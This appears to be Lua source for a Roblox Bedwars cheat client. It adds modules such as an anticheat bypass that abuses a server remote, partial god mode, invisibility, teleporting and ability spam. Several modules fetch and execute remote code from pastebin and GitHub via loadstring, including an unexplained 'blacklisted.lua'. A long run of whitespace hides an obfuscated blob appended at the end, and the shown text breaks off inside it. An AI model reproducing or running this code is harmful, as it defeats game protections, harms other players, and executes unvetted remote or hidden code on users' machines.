		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)

	runFunction(function()
		local AutoEmber = {Enabled = false}
		AutoEmber = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "4BigGuysExploit",
			HoverText = "Automatically uses the ember ability.",
			Function = function(callback)
				if callback then 
					task.spawn(function()
						repeat 
							local saber = getItem("infernal_saber")
							if killauraNearPlayer and saber then 
								bedwars.ClientHandler:Get("HellBladeRelease"):SendToServer({chargeTime = 0.5, player = lplr, weapon = saber.tool})
							end
							task.wait()
						until not AutoEmber.Enabled
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)
																																																																						
do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if 1~=bd then be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,((table.create or function(cs,ct)local cu={};for cv=1,cs do cu[cv]=ct;end;return cu;end)or tostring)else bl=1 end else if bd==2 then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if bk<2 then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if 5>bk then for bj=0,cv-1 do cw[bj]=bg(bj)end else cx=1 end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if 1<bj then da=bh(be(bi,cx,(cx+cz)-1),36)else cx=cx+1 end end else if bj<=3 then cx=(cx+cz)else if 5~=bj then return da else break end end end bj=bj+1 end end else if bk>7 then cu[1]=cs else cs=bg(cy())end end else if bk<=9 then while(cx<#bi and#a==d)do local a=cy()if cw[a]then ct=cw[a]else ct=cs..be(cs,1,1)end cw[cv]=cs..be(ct,1,1)cu[#cu+1],cs,cv=ct,ct,(cv+1)end else if 10<bk then break else return bf(cu)end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if bd~=5 then bo={}else c={s,k,w,m,o,j,y,q,x,l,u,i,nil,nil};end else if bd<=6 then bp=v else if bd<8 then bq=bp(bo)else br,bs=1,((-13538+(function()local a,b=0,1;local a=(function(c,d,q)c(c(q,q,c),c(q,d,q)and q(q,q,d),c(d,q,d))end)(function(c,d,q)if a>125 then return d end a=a+1 b=(b*626)%46725 if(b%1998)<999 then b=(b+258)%32131 return d(c(d,d,q),c(q,c,d),q(q,d and d,d))else return c end return d end,function(c,d,q)if a>163 then return c end a=a+1 b=(b-818)%35974 if(b%264)>=132 then b=(b-827)%18625 return c else return d(q(d,q,d),d(d,c,d),q(d,c,q))end return d(q(q and q,c,q),c(q and d,c,q),c(d,d and d,q))end,function(c,d,q)if a>308 then return d end a=a+1 b=(b-182)%34662 if(b%1530)>=765 then return q else return q(c(q,q,q)and q(q,c,q),d(c and c,d,c and d),c(q,c,d)and d(d,d and c,c))end return d(q(d,c,d),q(q,q,q),d(d,q,d and c))end)return b;end)()))end end end end else if bd<=12 then if bd<=10 then if 9==bd then bt={}else bu=function(a,b)local c,d=0 while true do if c<=1 then if 1~=c then d=0 else for q=0,31 do local s=(a%2)local v=b%2 if not(s~=0)then if not(v~=1)then b=b-1 d=d+2^q end else a=(a-1)if not(v~=0)then d=(d+2^q)else b=(b-1)end end b=(b/2)a=(a/2)end end else if 3>c then return d else break end end c=c+1 end end end else if bd==11 then bv=function(a,b)local c=0 while true do if c~=1 then return(a*(2^b));else break end c=c+1 end end else bw=function()local a,b,c=0 while true do if a<=1 then if a>0 then b,c=bu(b,bs),bu(c,bs);else b,c=h(bn,br,br+2)end else if a<=2 then br=(br+2);else if a>3 then break else return((bv(c,8))+b);end end end a=a+1 end end end end else if bd<=14 then if bd<14 then do for a,b in o,l(bl)do bt[a]=b;end;end;else bx=bt end else if bd<=15 then by=function(a,b)local c=0 while true do if 0<c then break else return p((a/2^b));end c=c+1 end end else if bd>16 then ca=function(a,b)local c=0 while true do if c~=1 then return((a+b)-bu(a,b))/2 else break end c=c+1 end end else bz=(2^32-1)end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if 18==bd then cb=bw()else cc=function(a,b)local c=0 while true do if c<1 then return bz-ca(bz-a,bz-b)else break end c=c+1 end end end else if 20==bd then cd=function(a,b,c)local d=0 while true do if 0<d then break else if c then local c=(((a/(2^((b-1)))))%2^((c-1)-(b-1)+1))return(c-c%1)else local b=2^(b-1)return(a%(b+b)>=b)and 1 or 0 end end d=d+1 end end else ce=bw()end end else if bd<=23 then if bd<23 then cf=function()local a,b,c,d,p=0 while true do if a<=1 then if a<1 then b,c,d,p=h(bn,br,(br+3))else b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);end else if a<=2 then br=br+4;else if a>3 then break else return(bv(p,24)+bv(d,16)+bv(c,8))+b;end end end a=a+1 end end else cg=function()local a,b=0 while true do if a<=1 then if 1~=a then b=bu(h(bn,br,br),cb)else br=(br+1);end else if a==2 then return b;else break end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if 26~=bd then ch=(-14488+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a>0 then c=48533 else b=526 end else if a<=2 then d=3 else if a~=4 then p=270 else q=540 end end end else if a<=7 then if a<=5 then s=12318 else if 7>a then v=385 else w=137 end end else if a<=8 then x=35083 else if a==9 then y=254 else be=340 end end end end else if a<=15 then if a<=12 then if 11<a then bg=170 else bf=2 end else if a<=13 then bh=19255 else if 15~=a then bi=1 else bj=423 end end end else if a<=18 then if a<=16 then bk=240 else if a==17 then bs=0 else bw,by=bs,bi end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if 1~=ce then cc(ca(ca,ca)and ca(ca,ca),cc(cc,(ca and ca))and cc(ca,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bk then local bk=bs while true do bk=(bk+bi)if not(bk~=bi)then return cc else break end end end else if 2>ce then bw=(bw+bi)else by=((by-bj)%bh)end end else if ce<=3 then if((by%be)<bg)then local be=bs while true do be=(be+bi)if((be>bf)or be==bf)then if(be<d)then return cc(ca(ca,(ca and cc)),cc(ca,ca))else break end else by=(by+y)%x end end else local x=bs while true do x=(x+bi)if(x<bf)then return cc else break end end end else if ce<5 then return ca else break end end end ce=ce+1 end end,function(x,y)local be=0 while true do if be<=2 then if be<=0 then if(bw>w)then local w=bs while true do w=w+bi if not(w~=bf)then break else return x end end end else if 2~=be then bw=bw+bi else by=((by*v)%s)end end else if be<=3 then if((by%q)>p)then local p=bs while true do p=(p+bi)if(p==bi or p<bi)then by=(by*b)%c else if not(not(p==d))then break else return x(y(x,y),x(y,x))end end end else local b=bs while true do b=b+bi if(b<bf)then return x else break end end end else if be~=5 then return y else break end end end be=be+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)());else ci=(-25303+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a~=1 then b=40425 else c=236 end else if a<=2 then d=960 else if 4>a then p=1920 else q=33223 end end end else if a<=7 then if a<=5 then s=2 else if 7~=a then v=894 else w=201 end end else if a<=8 then x=3 else if a~=10 then y=1330 else be=5906 end end end end else if a<=15 then if a<=12 then if 11<a then bg=665 else bf=617 end else if a<=13 then bh=211 else if a==14 then bi=33389 else bj=787 end end end else if a<=18 then if a<=16 then bk=1 else if 18>a then bs=0 else bw,by=bs,bk end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if ce==0 then cc(cc(ca,ca),ca(cc,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bh then local bh=bs while true do bh=bh+bk if not(bh~=bk)then return cc else break end end end else if 1==ce then bw=(bw+bk)else by=((by-bj)%bi)end end else if ce<=3 then if(by%y)<bg then local y=bs while true do y=(y+bk)if(y==bk or y<bk)then by=(by*bf)%be else if not(y~=x)then break else return cc(cc(cc,cc),(ca(cc,cc)and cc(ca,cc)))end end end else local y=bs while true do y=(y+bk)if not(y~=s)then break else return cc end end end else if ce<5 then return cc else break end end end ce=ce+1 end end,function(y,be)local bf=0 while true do if bf<=2 then if bf<=0 then if(bw>w)then local w=bs while true do w=(w+bk)if not(not(w==s))then break else return be end end end else if bf==1 then bw=(bw+bk)else by=((by+v)%q)end end else if bf<=3 then if((by%p)>d)then local d=bs while true do d=(d+bk)if(d<bk or d==bk)then by=((by*c)%b)else if not(not(d==x))then break else return be(y(y,be and y),be(be,y))end end end else local b=bs while true do b=(b+bk)if b>bk then break else return y end end end else if 5~=bf then return y else break end end end bf=bf+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)());end end end end else if bd<=31 then if bd<=28 then if bd~=28 then cj=(-1671+(function()local a=409;local b=818;local c=28939;local d=222;local p=389;local q=38485;local s=1166;local v=583;local w=9454;local x=425;local y=4509;local be=442;local bf=292;local bg=3;local bh=1696;local bi=848;local bj=579;local bk=10108;local bs=252;local bw=908;local by=5205;local bz=470;local ca=746;local cc=1816;local ce=18568;local cs=2;local ct=1;local cu=421;local cv=0;local cw,cx=cv,ct;local a=(function(cy,cz,da,db)cy(cz(db,db,da,db),da(cz,cy,cz,db),da(da,cz,da,da),db(cz and cy,db,da,da))end)(function(cy,cz,da,db)if(cw>cu)then local cu=cv while true do cu=(cu+ct)if(cu<cs)then return cz else break end end end cw=cw+ct cx=(cx+ca)%ce if((cx%cc)==bw or(cx%cc)>bw)then local bw=cv while true do bw=bw+ct if(bw==ct or bw<ct)then cx=(cx-bz)%by else if not(bw~=cs)then return cz(cy(da,cy,cy,(cz and da)),da(cz,cz,cy,(da and db)),da(cy,db,cy,da),(cy(da,(db and cz),cz and da,cy)and cy((da and db),da and cy,db,da)))else break end end end else local bw=cv while true do bw=bw+ct if not(bw~=cs)then break else return cy end end end return cz end,function(bw,by,ca,cc)if cw>bs then local bs=cv while true do bs=bs+ct if not(bs~=cs)then break else return bw end end end cw=cw+ct cx=((cx-bj)%bk)if((cx%bh)==bi or(cx%bh)>bi)then local bh=cv while true do bh=bh+ct if(bh==cs or bh>cs)then if(bh<bg)then return ca else break end else cx=(cx*bf)%y end end else local y=cv while true do y=(y+ct)if(y<cs)then return bw(by(cc and by,bw and by,(ca and bw),bw),(cc(by,cc,by,(ca and cc))and ca(ca,cc,ca,ca)),ca(cc,bw and cc,bw,cc)and by(bw,bw and bw,ca,by),ca(ca,cc,(by and cc),ca))else break end end end return bw(ca(ca,by,ca and bw,cc),cc(ca,ca,cc,bw),bw(cc,cc,by,bw),by(bw,(bw and bw),ca,cc))end,function(y,bf,bh,bi)if(cw>be)then local be=cv while true do be=be+ct if be<cs then return bi else break end end end cw=cw+ct cx=((cx+x)%w)if((cx%s)>v or(cx%s)==v)then local s=cv while true do s=(s+ct)if(s<ct or s==ct)then cx=((cx-bz)%q)else if not(s~=bg)then break else return bi end end end else local q=cv while true do q=(q+ct)if not(q~=cs)then break else return bh(y(bh,(y and bh),bf,bi),(bi(bh,y,bf,bh)and bf(bi,bi and bh,bf,bh and bi)),bh(bf,bh,y,bh),bf(bf,bi,bf,bf))end end end return y(bh(bf and bi,bf,bf and 